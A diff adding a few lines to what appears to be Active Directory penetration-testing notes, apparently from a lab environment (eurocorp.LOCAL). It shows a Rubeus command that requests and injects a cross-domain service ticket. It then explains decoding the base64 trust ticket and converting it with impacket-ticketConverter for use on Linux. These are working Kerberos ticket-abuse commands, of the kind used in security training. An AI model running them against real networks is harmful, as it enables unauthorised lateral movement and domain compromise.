@@ -2048,6 +2048,18 @@ Returns `base64(ticket.kirbi)`
 Rubeus.exe -args asktgs /service:cifs/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket:output_of_ticket_base64
 ```
 
+Command returned a base64 encoded trusted between domains ticket to convert and use it in linux
+
+Copy base64 ticket from Rubeus output, paste in local linux machine 
+
+```bash
+nano trust_ticket.b64   
+cat trust_ticket.b64| base64 -d > trust_ticket.kirbi   
+impacket-ticketConverter trust_ticket.kirbi trust_ticket.ccache   
+```
+
+And it will be converted and ready to use
+
 [[tickets]]
 == Golden,Silver,Diamond tickets generation
 
